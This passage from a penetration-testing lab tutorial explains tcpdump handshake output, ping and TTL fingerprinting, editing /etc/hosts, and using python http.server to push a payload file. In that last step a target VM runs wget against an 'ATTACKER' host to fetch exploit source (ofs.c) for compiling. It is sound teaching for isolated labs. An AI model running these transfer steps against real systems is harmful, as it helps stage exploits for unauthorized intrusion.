   receive window, `mss 1460` the largest segment you accept.
2. `Flags [S.]` — **SYN-ACK**. The target answers: here is *my* sequence number, and I
   acknowledge yours (`ack 2879401124`, i.e. your seq + 1). **This single packet is
   what nmap's `-sS` scan is looking for.**
3. `Flags [.]` — a bare **ACK**. The handshake completes. The connection is now
   established. Note the timestamp: all three packets within **0.9 ms** — a local VM.
4. `Flags [P.]` — **PSH+ACK**, i.e. "here is data, push it to the application".
   `HTTP: GET / HTTP/1.1` — tcpdump decoded the payload for you because port 80 is a
   known protocol.
5. The reply: `HTTP: HTTP/1.1 200 OK`, 238 bytes.

**Why this is worth five minutes of your life.** Now you can *see* the difference
between `open` (you receive a SYN-ACK), `closed` (you receive a packet with
`Flags [R.]` — RST — instead), and `filtered` (**you receive nothing at all**). Run
tcpdump while nmap scans a filtered host and the absence of replies is the whole story.
It also explains why `-sS` is called "half-open": nmap sends the SYN, sees the SYN-ACK,
and then sends **RST** instead of the final ACK — so the connection is never completed
and many applications never log it.

---

### 6.10 `ping` and why its silence proves nothing

```bash
ping -c 3 192.168.56.104
```

```text
PING 192.168.56.104 (192.168.56.104) 56(84) bytes of data.
64 bytes from 192.168.56.104: icmp_seq=1 ttl=64 time=0.412 ms
64 bytes from 192.168.56.104: icmp_seq=2 ttl=64 time=0.388 ms
64 bytes from 192.168.56.104: icmp_seq=3 ttl=64 time=0.401 ms

--- 192.168.56.104 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 4ms
rtt min/avg/max/mdev = 0.388/0.400/0.412/0.010 ms
```

**The input:** `-c 3` sends three Echo Requests and exits (without it, `ping` runs
forever — a beginner "hang" that is not a hang). `56(84) bytes` = 56 bytes of ICMP
payload, 84 bytes on the wire including the 20-byte IP header and 8-byte ICMP header.

**Reading it**

1. `icmp_seq=1` — the sequence number. Gaps here mean packet loss mid-stream.
2. **`ttl=64`** — Time To Live, the hop counter. Each router decrements it. Linux
   defaults to 64, Windows to 128, Cisco/many network devices to 255. **A `ttl=64`
   reply with no decrement means "same subnet, Linux, zero routers in between."** This
   is a free OS guess — exactly what nmap's `-O` fingerprinting builds on.
3. `0% packet loss` and `rtt min/avg/max/mdev` — the timing summary. `mdev` is the
   standard deviation; a high mdev on a local VM means the host is overloaded.
4. **The critical caveat:** `100% packet loss` does **not** mean the host is down.
   ICMP Echo is trivially blocked by firewalls, and hardened servers drop it by
   default. That is precisely why `arp-scan` (§6.2) is the right first move on a lab
   subnet, and why nmap as root adds an ARP probe automatically.

---

### 6.11 `echo "IP name" | sudo tee -a /etc/hosts` — the hostname trick

```bash
echo "192.168.56.104  vtcsec" | sudo tee -a /etc/hosts
grep vtcsec /etc/hosts
```

```text
192.168.56.104  vtcsec
192.168.56.104  vtcsec
```

**The input**

| Token | Meaning |
| --- | --- |
| `echo "…"` | print the string. **Two spaces** between IP and name is conventional (tab or space both work) |
| `\|` | pipe: connect `echo`'s stdout to the next command's stdin |
| `sudo tee -a /etc/hosts` | `tee` writes stdin to a file **and** to stdout; `-a` **appends** instead of truncating. Running `tee` under `sudo` makes the *write* happen as root |
| `grep vtcsec /etc/hosts` | verify the line landed |

**Why not `sudo echo "…" >> /etc/hosts`?** Because the shell evaluates the `>>`
redirection **before** running `sudo`. The redirection is performed by your
*unprivileged* shell, so it fails with `Permission denied` even though the command
looks root-ish. `tee` moves the write *inside* the privileged process. This is a
general Unix lesson about who actually performs each part of a pipeline.

**Why the entry is needed at all.** WordPress, Drupal and many PHP apps store their
own base URL in the database (`wp_options.siteurl`). If that value is `http://vtcsec`
and you browse to `http://192.168.56.104`, every generated link points at a hostname
your machine cannot resolve — the page loads broken, logins redirect away, and assets
404. Mapping the expected hostname in `/etc/hosts` makes the app behave. **Machines 1,
4, 12 and 13 all require this.**

`grep` printing the line **twice** means you appended it twice — harmless, but it
tells you the command ran more than once. Remove duplicates with
`sudo sed -i '/vtcsec/d' /etc/hosts` and re-add cleanly.

---

### 6.12 `python3 -m http.server 8000` — serve a file to the target

```bash
# ATTACKER, in the directory holding your payload
python3 -m http.server 8000

# TARGET
wget http://192.168.56.10:8000/ofs.c -O ofs.c
md5sum ofs.c
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.56.104 - - [11/May/2024 10:41:07] "GET /ofs.c HTTP/1.1" 200 -
```

```text
$ md5sum ofs.c
9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c  ofs.c
```

**The input**

| Token | Meaning |
| --- | --- |
| `python3 -m http.server` | run the `http.server` module as a script — a complete static web server in one command, serving the **current directory** |
| `8000` | the port |
| `0.0.0.0` in the output | it bound to **all interfaces**, so the target VM can reach it. (Binding to `127.0.0.1` would make it unreachable — a common mistake) |

**Reading the output**

1. `Serving HTTP on 0.0.0.0 port 8000` — the server is up and reachable on every
   interface.
2. Each request logs as `CLIENT_IP - - [timestamp] "METHOD PATH PROTOCOL" STATUS SIZE`.
   Here: `192.168.56.104` (the target) requested `GET /ofs.c`, and got **`200`**.
3. **This log is your confirmation.** If the target's `wget` reports success but you see
   no log line, the request went somewhere else — check which interface IP you used.
4. A `404` in the log means the filename is wrong; a missing log line entirely means
   the target could not reach you (firewall, wrong subnet, or the server is bound to
   localhost).

**Then verify the transfer.** `md5sum ofs.c` prints `<32-hex-digits>  <filename>`.
Compare it against the same command run on your attack box. **Identical hashes = the
file arrived intact.** This matters because a truncated download produces a `gcc` error
that looks like a bug in the exploit rather than a broken transfer. (`sha256sum` is the
stronger choice; MD5 here is only an integrity check, not a security control.)

**Stopping it:** `Ctrl+C`. It runs in the foreground by design — you want to see the
log. Use a second terminal for everything else.

---

_Back to [Learning Path 1](README.md) · previous: [00 — Before You Start](00-Before-You-Start.md) · next: [02 — Web Attacks](02-Web-Attacks.md)._
